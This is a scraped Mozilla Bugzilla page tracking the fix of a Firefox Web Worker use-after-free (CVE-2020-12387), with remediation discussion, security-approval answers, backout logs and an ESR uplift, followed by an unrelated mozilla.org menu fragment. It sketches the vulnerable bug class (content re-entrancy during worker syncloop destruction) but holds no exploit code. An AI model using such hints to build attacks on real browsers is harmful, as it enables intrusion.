|  | |

Too late for 71.

[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=wontfix)

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1545345#c32)• 5 years ago |
|  | |

72 seems unlikely now.

[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=affected) → [fix-optional](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fix-optional)

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a22150195_580382)• 5 years ago |

[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
[fix-optional](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fix-optional) → [wontfix](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=wontfix)

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a23045254_451704)• 5 years ago |

[status-firefox74](/buglist.cgi?f1=cf_status_firefox74&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=affected)
[tracking-firefox74](/buglist.cgi?f1=cf_tracking_firefox74&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox74&o1=equals&v1=%2B)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a25188626_75935)• 5 years ago |

[status-firefox73](/buglist.cgi?f1=cf_status_firefox73&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=wontfix)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1545345#c33)• 5 years ago |
|  | |

Attempts to re-create this on trunk post-landing of [bug 1588248](/show_bug.cgi?id=1588248 "RESOLVED FIXED - Assertion failure: !mProxy->mSyncLoopTarget, at src/dom/xhr/XMLHttpRequestWorker.cpp:1416") seem to indicate that the problem has been mitigated since that landed in 72. I believe the particular permutation of events was the Sync XHR on the stack twice with the DETH global destruction on the stack (and then multiple Unpin calls lined up). Since it's no longer possible to get the same Sync XHR on the stack twice, the UAF is mitigated.

I'm going to start putting up patches later today with variants of

1. Allow the global to mark when JS shouldn't run.
2. Have BroadcastChannel/friends check to not even bother trying to run JS in the closing state.
3. Defer global destruction until the stack has actually unwound.

Any of the 3 would have prevented the problem, although all 3 are required for sanity/correctness.

|  | [Pascal Chevrel:pascalc](/user_profile?user_id=24572) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1545345#c34)• 5 years ago |
|  | |

Too late for 74.

[status-firefox74](/buglist.cgi?f1=cf_status_firefox74&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=wontfix)
[status-firefox75](/buglist.cgi?f1=cf_status_firefox75&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox75&o1=equals&v1=affected)
[tracking-firefox75](/buglist.cgi?f1=cf_tracking_firefox75&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox75&o1=equals&v1=%2B)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a27270812_75935)• 5 years ago |

Depends on: [1588248](/show_bug.cgi?id=1588248 "RESOLVED FIXED - Assertion failure: !mProxy->mSyncLoopTarget, at src/dom/xhr/XMLHttpRequestWorker.cpp:1416")

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1545345#c35)• 5 years ago |
|  | |

For the fixes here, we'll also want [bug 1588248](/show_bug.cgi?id=1588248 "RESOLVED FIXED - Assertion failure: !mProxy->mSyncLoopTarget, at src/dom/xhr/XMLHttpRequestWorker.cpp:1416") uplifted to esr68 to help mitigate. I've requested uplift approval for the fix on that bug.

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1545345#c37)• 5 years ago |
|  | |

Is this ready for sec-approval?

[status-firefox76](/buglist.cgi?f1=cf_status_firefox76&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox76&o1=equals&v1=affected)
[tracking-firefox76](/buglist.cgi?f1=cf_tracking_firefox76&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox76&o1=equals&v1=%2B)Flags: needinfo?(bugmail)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1545345#c38)• 5 years ago |
|  | |

No, we want :baku's review as well. I've upgraded his review request to blocking to make that clear.

Relatedly, has our taskcluster migration given us a private try server that we can safely push security fixes to in order to have better test coverage than my local testing?

Flags: needinfo?(bugmail)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1545345#c39)• 5 years ago |
|  | |

Setting NI on baku for review as well.

Flags: needinfo?(amarchesini)

|  | [Andrea Marchesini [:baku]](/user_profile?user_id=446257) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a28553246_446257)• 5 years ago |

Flags: needinfo?(amarchesini)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1545345#c40)• 5 years ago |
|  | |

I'm currently running additional local tests against trunk and ESR68. :RyanVM indicated via other channels that there is not currently a private try server available.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1545345#c41)• 5 years ago |
|  | |

The exact test-case no longer reproduced, but I've been concerned about other potential syncloop gadgets so now after some assistance from :jkratzer I'm pursuing directed fuzzing. The question I'm trying to answer is whether we've already mitigated the class of UAFs initially seen on this bug, and if so, on which releases it's mitigated. The rationale is that there is some level of analytic complexity risk from the fix and it would be preferable to land it on trunk only, at least initially.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=1545345#c42)• 5 years ago |
|  | |

And by class of UAFs I mean:

* MessageChannel/BroadcastChannel allow content to run during syncloop destruction.
* Syncloop-using APIs are called during syncloop destruction in a way that allows for use-after-frees due to bad assumptions in syncloop-using code. (This may have required bad assumptions in conjunction with unsafe uses of raw pointers in cases that erroneously assume the raw pointer usage was covered by a strong reference.)

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=1545345#c43)• 5 years ago |
|  | |

Sounds like this might be too risky to land late in the beta cycle, so I'll call it wontfix for 75; hopefully we can have it bake some more on 76.

[status-firefox75](/buglist.cgi?f1=cf_status_firefox75&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox75&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox75&o1=equals&v1=wontfix)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=1545345#c44)• 5 years ago |
|  | |

Comment on [attachment 9130470](/attachment.cgi?id=9130470 "Bug 1545345 - Improve worker shutdown. r=baku,smaug") [[details]](/attachment.cgi?id=9130470&action=edit "Bug 1545345 - Improve worker shutdown. r=baku,smaug")

[Bug 1545345](/show_bug.cgi?id=1545345 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest") - Improve worker shutdown. r=baku,smaug

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Not 100% clear at this time. It's possible that the landing of [bug 1588248](/show_bug.cgi?id=1588248 "RESOLVED FIXED - Assertion failure: !mProxy->mSyncLoopTarget, at src/dom/xhr/XMLHttpRequestWorker.cpp:1416") (which is now on all supported branches including ESR68) solved the only UAF. I'm attempting local fuzzing to see if other issues might exist, but we can consider sec-approval in parallel to me finishing that up.

This patch is about closing holes that definitely result in invariants being violated. We do know how to violate the invariants from tests, we don't know how to cause a UAF.

If someone suspects that the patch might be related to a secbug, they might be suspicious of things involving syncloops and content re-entrancy. This would give them a general idea of what to pursue, but various things that have landed (workers run at higher priorities, we do more global checks, etc.) should have upped the difficulty level.

We do have bugs on generally improving the state of workers so we could try and land this under the auspices of a bug like [bug 1539508](/show_bug.cgi?id=1539508 "NEW - [meta] Simplify WorkerPrivate's end-of-life flow").

* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: Unknown
* **Which older supported branches are affected by this flaw?**: esr68?
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: Yes
* **If not, how different, hard to create, and risky will they be?**:
* **How likely is this patch to cause regressions; how much testing does it need?**: The patch was intentionally designed to not be risky, but it's still touching/fixing stuff that's scary. In discussion with RyanVM (and his discussions), we've been talking about letting this just ride the train on nightly to beta and in general seeing how it bakes.
[Attachment #9130470](/attachment.cgi?id=9130470&action=edit "Bug 1545345 - Improve worker shutdown. r=baku,smaug") -
Flags: sec-approval?

|  | [Jens Stutte [:jstutte]](/user_profile?user_id=646284) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a29476542_646284)• 5 years ago |

No longer blocks: [1547059](/show_bug.cgi?id=1547059 "RESOLVED DUPLICATE - AddressSanitizer: heap-use-after-free [@ CCGraphBuilder::NoteXPCOMChild] with READ of size 8")

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a29524244_1689)• 5 years ago |

[Attachment #9130470](/attachment.cgi?id=9130470&action=edit "Bug 1545345 - Improve worker shutdown. r=baku,smaug") -
Flags: sec-approval? → sec-approval+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=1545345#c45)• 5 years ago |
|  | |

> If someone suspects that the patch might be related to a secbug,

We assume they will identify security patches since the check-in comment will have a bug reference that's not accessible, or suspiciously omit the bug number. The latter is bad for us in the future ("why is this here?") so please do put in the bug number.

sec-approval+

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 46](/show_bug.cgi?id=1545345#c46)• 5 years ago |
|  | |

Landed: <https://hg.mozilla.org/integration/autoland/rev/e608cbaf20d451fe0dd63e778ffa3f9408b8c43d>

Backed out for assertion failures on WorkerPrivate.cpp:

<https://hg.mozilla.org/integration/autoland/rev/a2d6508940de2b5cea50e409f6d00ee57711938c>

Push with failures: <https://treeherder.mozilla.org/#/jobs?repo=autoland&group_state=expanded&resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel%2Crunnable&revision=e608cbaf20d451fe0dd63e778ffa3f9408b8c43d&selectedJob=295001539>

Failure log: <https://treeherder.mozilla.org/logviewer.html#?job_id=295001539&repo=autoland>

devtools/client/aboutdebugging/test/browser/browser\_aboutdebugging\_devtoolstoolbox\_reload.js

[task 2020-03-27T05:39:54.830Z] 05:39:54 INFO - GECKO(3816) | Assertion failure: mSyncLoopStack.IsEmpty(), at /builds/worker/checkouts/gecko/dom/workers/WorkerPrivate.cpp:3512

[task 2020-03-27T05:39:54.910Z] 05:39:54 INFO - GECKO(3816) | #01: mozilla::dom::WorkerPrivate::DestroySyncLoop(unsigned int) [dom/workers/WorkerPrivate.cpp:3931]

[task 2020-03-27T05:39:54.910Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.911Z] 05:39:54 INFO - GECKO(3816) | #02: mozilla::dom::WorkerPrivate::RunCurrentSyncLoop() [dom/workers/WorkerPrivate.cpp:3905]

[task 2020-03-27T05:39:54.911Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.913Z] 05:39:54 INFO - GECKO(3816) | #03: mozilla::dom::`anonymous namespace'::LoadAllScripts(mozilla::dom::WorkerPrivate*, mozilla::UniquePtr<mozilla::dom::SerializedStackHolder,mozilla::DefaultDelete<mozilla::dom::SerializedStackHolder> >, nsTArray<mozilla::dom::(anonymous namespace)::ScriptLoadInfo>&, bool, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&) [dom/workers/ScriptLoader.cpp:2242] [task 2020-03-27T05:39:54.914Z] 05:39:54 INFO - [task 2020-03-27T05:39:54.914Z] 05:39:54 INFO - GECKO(3816) | #04: mozilla::dom::workerinternals::LoadMainScript(mozilla::dom::WorkerPrivate*, mozilla::UniquePtr<mozilla::dom::SerializedStackHolder,mozilla::DefaultDelete<mozilla::dom::SerializedStackHolder> >, nsTSubstring<char16_t> const&, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&) [dom/workers/ScriptLoader.cpp:2349] [task 2020-03-27T05:39:54.914Z] 05:39:54 INFO - [task 2020-03-27T05:39:54.914Z] 05:39:54 INFO - GECKO(3816) | #05: mozilla::dom::`anonymous namespace'::CompileScriptRunnable::WorkerRun(JSContext\*, mozilla::dom::WorkerPrivate\*) [dom/workers/WorkerPrivate.cpp:343]

[task 2020-03-27T05:39:54.914Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.914Z] 05:39:54 INFO - GECKO(3816) | #06: mozilla::dom::WorkerRunnable::Run() [dom/workers/WorkerRunnable.cpp:371]

[task 2020-03-27T05:39:54.914Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO - GECKO(3816) | #07: nsThread::ProcessNextEvent(bool, bool\*) [xpcom/threads/nsThread.cpp:1222]

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO - GECKO(3816) | #08: NS\_ProcessNextEvent(nsIThread\*, bool) [xpcom/threads/nsThreadUtils.cpp:481]

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO - GECKO(3816) | #09: mozilla::dom::WorkerPrivate::DoRunLoop(JSContext\*) [dom/workers/WorkerPrivate.cpp:2912]

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO - GECKO(3816) | #10: mozilla::dom::workerinternals::`anonymous namespace'::WorkerThreadPrimaryRunnable::Run() [dom/workers/RuntimeService.cpp:2301]

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO - GECKO(3816) | #11: nsThread::ProcessNextEvent(bool, bool\*) [xpcom/threads/nsThread.cpp:1222]

[task 2020-03-27T05:39:54.916Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.917Z] 05:39:54 INFO - GECKO(3816) | #12: NS\_ProcessNextEvent(nsIThread\*, bool) [xpcom/threads/nsThreadUtils.cpp:481]

[task 2020-03-27T05:39:54.917Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.918Z] 05:39:54 INFO - GECKO(3816) | #13: mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate\*) [ipc/glue/MessagePump.cpp:332]

[task 2020-03-27T05:39:54.918Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.918Z] 05:39:54 INFO - GECKO(3816) | #14: MessageLoop::RunInternal() [ipc/chromium/src/base/message\_loop.cc:315]

[task 2020-03-27T05:39:54.918Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.918Z] 05:39:54 INFO - GECKO(3816) | #15: MessageLoop::RunHandler() [ipc/chromium/src/base/message\_loop.cc:309]

[task 2020-03-27T05:39:54.918Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.919Z] 05:39:54 INFO - GECKO(3816) | #16: MessageLoop::Run() [ipc/chromium/src/base/message\_loop.cc:291]

[task 2020-03-27T05:39:54.919Z] 05:39:54 INFO -

[task 2020-03-27T05:39:54.919Z] 05:39:54 INFO - GECKO(3816) | #17: static nsThread::ThreadFunc(void\*) [xpcom/threads/nsThread.cpp:466]

[task 2020-03-27T05:39:54.919Z] 05:39:54 INFO -

[task 2020-03-27T05:39:55.528Z] 05:39:55 INFO - GECKO(3816) | #18: \_PR\_NativeRunThread(void\*) [nsprpub/pr/src/threads/combined/pruthr.c:399]

[task 2020-03-27T05:39:55.528Z] 05:39:55 INFO -

[task 2020-03-27T05:39:55.531Z] 05:39:55 INFO - GECKO(3816) | #19: pr\_root(void\*) [nsprpub/pr/src/md/windows/w95thred.c:139]

[task 2020-03-27T05:39:55.531Z] 05:39:55 INFO -

[task 2020-03-27T05:39:55.534Z] 05:39:55 INFO - GECKO(3816) | #20: ucrtbase.DLL + 0x3e16f

[task 2020-03-27T05:39:55.534Z] 05:39:55 INFO -

[task 2020-03-27T05:39:55.534Z] 05:39:55 INFO - GECKO(3816) | #21: kernel32.dll + 0x4ef3c

[task 2020-03-27T05:39:55.534Z] 05:39:55 INFO -

[task 2020-03-27T05:39:55.534Z] 05:39:55 INFO - GECKO(3816) | #22: ntdll.dll + 0x63618

[task 2020-03-27T05:39:55.534Z] 05:39:55 INFO -

[task 2020-03-27T05:39:55.534Z] 05:39:55 INFO - GECKO(3816) | #23: ntdll.dll + 0x635eb

Flags: needinfo?(bugmail)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 47](/show_bug.cgi?id=1545345#c47)• 5 years ago |
|  | |

My local test matrix was primarily using ASAN for most directories, missing the fact that normal `MOZ_ASSERT`s will not fire in that case although many other DEBUG-only things are run under ASAN. I've corrected the sanity-checking assertion locally and am locally re-running impacted tests under a full DEBUG build and will re-submit shortly.

Flags: needinfo?(bugmail)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 48](/show_bug.cgi?id=1545345#c48)• 5 years ago |
|  | |

Landed: <https://hg.mozilla.org/integration/autoland/rev/1911a0d1e751345189e314a40e439207ecefe6fc>

Backed out for causing CallbackObject.cpp Hazard failures:

<https://hg.mozilla.org/integration/autoland/rev/b261e44b83ad010cbc4c6973dea831260963e1e7>

Push with failure: <https://treeherder.mozilla.org/#/jobs?repo=autoland&group_state=expanded&selectedJob=295119136&resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel%2Crunnable&revision=f41ad60fa0d98fa793bdbb7a74c755467ab45d6e>

Failure log: <https://treeherder.mozilla.org/logviewer.html#?job_id=295105741&repo=autoland>

TEST-UNEXPECTED-FAIL | hazards | unrooted 'realCallback' of type 'JSObject\*' live across GC call at dom/bindings/CallbackObject.cpp:245

Flags: needinfo?(bugmail)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 49](/show_bug.cgi?id=1545345#c49)• 5 years ago |
|  | |

I've consulted with :sfink on the hazard analysis which did not like the QueryInterface calls performed in <https://searchfox.org/mozilla-central/rev/8526066f548af9ec3ebb462ff73c47ccc183f533/js/xpconnect/wrappers/WrapperFactory.cpp#843>. This call previously didn't matter because the unrooted `realCallback` was not used beyond the call. But with the forbidden script check refactoring, it is.

Given the analytical issues involved, we've opted to go with rooting `realCallback`. Since the patch has already been rendered public already by the 2 bounced landings, I've pushed a hazard analysis job to try and will re-land assuming that comes back green:

<https://treeherder.mozilla.org/#/jobs?repo=try&revision=e71b9e9ea2372febb5593034e1c0c0e30cb117d6>

Flags: needinfo?(bugmail)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 50](/show_bug.cgi?id=1545345#c50)• 5 years ago |
|  | |

<https://hg.mozilla.org/integration/autoland/rev/cb814ebff5a56845db97bbed1ef52b0c523661f1>

<https://hg.mozilla.org/mozilla-central/rev/cb814ebff5a5>

Group: dom-core-security → core-security-releaseStatus: ASSIGNED → RESOLVEDClosed: 5 years ago
[status-firefox76](/buglist.cgi?f1=cf_status_firefox76&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox76&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox76&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → mozilla76

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 51](/show_bug.cgi?id=1545345#c51)• 5 years ago |
|  | |

(not urgent) Looks like this'll eventually need a rebased patch for ESR68.

[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F) → [76+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=76%2B)Flags: needinfo?(bugmail)

|  | [Brindusa Tot, Desktop QA](/user_profile?user_id=553429) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a30106619_553429)• 5 years ago |

Flags: qe-verify+Whiteboard: [post-critsmash-triage]

|  | [Daniel Bodea [:danibodea]](/user_profile?user_id=616104) |  |
| --- | --- | --- |
| [Comment 52](/show_bug.cgi?id=1545345#c52)• 5 years ago |
|  | |

I am attempting to verify this fix, but I am having trouble creating the server correctly. Can you provide more detailed steps (or a tutorial that I could understand) on the server creation part? My skills stop at the creation of the Simple HTTP server. Thank you.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 53](/show_bug.cgi?id=1545345#c53)• 5 years ago |
|  | |

A number of other accidentally mitigating fixes have meant that the reproducing test cases haven't worked for a very long time. We're still pursuing fuzzer improvements to help provide confirmation of the fixes, but for now the fix can't be verified.

Flags: qe-verify+ → qe-verify-

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 54](/show_bug.cgi?id=1545345#c54)• 5 years ago |
|  | |

Attached file
[Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug](attachment.cgi?id=9141601)
— [Details](attachment.cgi?id=9141601&action=edit)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 55](/show_bug.cgi?id=1545345#c55)• 5 years ago |
|  | |

Comment on [attachment 9141601](/attachment.cgi?id=9141601 "Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug") [[details]](/attachment.cgi?id=9141601&action=edit "Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug")

[Bug 1545345](/show_bug.cgi?id=1545345 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest") - Improve worker shutdown on ESR68. r=baku,smaug

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**:
* **User impact if declined**:
* **Fix Landed on Version**:
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: It seems to have not exploded anything on the branches it already landed on.
* **String or UUID changes made by this patch**:
Flags: needinfo?(bugmail)
[Attachment #9141601](/attachment.cgi?id=9141601&action=edit "Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug") -
Flags: approval-mozilla-esr68?

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 56](/show_bug.cgi?id=1545345#c56)• 5 years ago |
|  | |

Patch is now updated for ESR68 in that separate phabricator request. I did some local testing with a debug build and explicitly including the test that caused the initial landing bounce. I did not push to try. I requested the uplift approval in case that's desired.

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 57](/show_bug.cgi?id=1545345#c57)• 5 years ago |
|  | |

Comment on [attachment 9141601](/attachment.cgi?id=9141601 "Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug") [[details]](/attachment.cgi?id=9141601&action=edit "Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug")

[Bug 1545345](/show_bug.cgi?id=1545345 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest") - Improve worker shutdown on ESR68. r=baku,smaug

Approved for 68.8esr.

[Attachment #9141601](/attachment.cgi?id=9141601&action=edit "Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug") -
Flags: approval-mozilla-esr68? → approval-mozilla-esr68+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 58](/show_bug.cgi?id=1545345#c58)• 5 years ago |
|  | |

<https://hg.mozilla.org/releases/mozilla-esr68/rev/45d7ff077528>

[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a32601860_428608)• 5 years ago |

Whiteboard: [post-critsmash-triage] → [post-critsmash-triage][adv-main76+]

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a32602872_428608)• 5 years ago |

Whiteboard: [post-critsmash-triage][adv-main76+] → [post-critsmash-triage][adv-main76+][adv-ESR68.8+]

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 59](/show_bug.cgi?id=1545345#c59)• 5 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9144306)
— [Details](attachment.cgi?id=9144306&action=edit)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a32675510_428608)• 5 years ago |

Alias: CVE-2020-12387

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a38072233_75935)• 5 years ago |

Regressions: [1649448](/show_bug.cgi?id=1649448 "RESOLVED FIXED - Assertion failure: aGlobal, at /builds/worker/checkouts/gecko/dom/file/Blob.cpp:74")

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a41340152_1689)• 4 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a161525644_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1545345&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Looben Yang](/user_profile?user_id=506912)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_99346820_20250119_122049.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
